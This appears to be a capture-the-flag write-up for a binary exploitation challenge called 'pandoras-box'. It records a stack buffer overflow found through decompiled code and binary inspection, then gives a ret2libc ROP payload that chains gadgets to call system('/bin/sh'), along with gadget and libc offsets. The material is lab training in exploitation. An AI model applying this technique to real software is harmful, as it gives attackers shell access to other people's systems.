# pandoras-box

**SOLVED**

> You stumbled upon one of Pandora's mythical boxes. 
> Would you be curious enough to open it and see what's inside, or would you opt to give it to your team for analysis?

```sh
strings pb

readelf -a pb

# seg
(echo "2"; python3 -c "import sys; sys.stdout.buffer.write(b'A'*56)") | ./pb
```

```c
// main
fgets((char *)&local_38,0x100,stdin); // 256
```

```c
void read_num(void) {
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  read(0,&local_28,0x1f); //31
  strtoul((char *)&local_28,(char **)0x0,0);
  return;
}

// unsigned long int strtoul(const char *str, char **endptr, int base)
//
// https://www.tutorialspoint.com/c_standard_library/c_function_strtoul.htm
// converts the initial part of the string in str to an unsigned long int 
// value according to the given base, which must be between 2 and 36 inclusive, or be the special value 0.
//
// base-0
// If the value of base is 0, the expected form of the subject sequence is that of a decimal constant, 
// octal constant, or hexadecimal constant, any of which may be preceded by a '+' or '-' sign
```

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'./glibc/'
```

```sh
ROPgadget --binary pb | grep rdi
# 0x000000000040142b : pop rdi ; ret

ldd pb
# linux-vdso.so.1 (0x00007ffdd9de0000)
#         libc.so.6 => ./glibc/libc.so.6 (0x00007f2463000000)
#         ./glibc/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f24633ce000)

readelf -s ./glibc/libc.so.6 | grep system
# 1481: 0000000000050d60    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5

strings -a -t x ./glibc/libc.so.6 | grep /bin/sh
# 1d8698 /bin/sh

gdb
file pb
info file

starti
b box

b *box+193
b* box+225
```

```sh
# sam's snippet
r <<< $(echo "2"; python3 -c "import sys; sys.stdout.buffer.write(b'A' * 85 + b'\x16\x10\x40\x00\x00\x00\x00\x00' + b'\x2b\x14\x40\x00\x00\x00\x00\x00' + b'\x98\x86\xdd\xf7\xff\x7f\x00\x00' + b'\x60\x0d\xc5\xf7\xff\x7f\x00\x00')")

# first address is a rop gadget for ret, 
# second is rop gadget for pop rdi; ret;, 
# third is  address to /bin/sh, fourth is call to system
```

```c
0x4012c2 // 4199106 (box)
0x40139e // 4199326 (box write)
// box+220

0x4012c2 // 4199106 (box)
0x40137e // 4199294 (box fgets)
// box+188

0x4012c2
0x401366 // 4199270 (box last fwrite)
// box+164


0x6c6977206557
```

```sh
ROPgadget --binary pb | grep rdi
# 0x000000000040142b : pop rdi ; ret

ldd pb
	# linux-vdso.so.1 (0x00007ffff7fc1000)
	# libc.so.6 => ./glibc/libc.so.6 (0x00007ffff7c00000)
	# ./glibc/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc3000)

readelf -s ./glibc/libc.so.6 | grep system
# 1481: 0000000000050d60    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5

strings -a -t x ./glibc/libc.so.6 | grep /bin/sh
# 1d8698 /bin/sh
```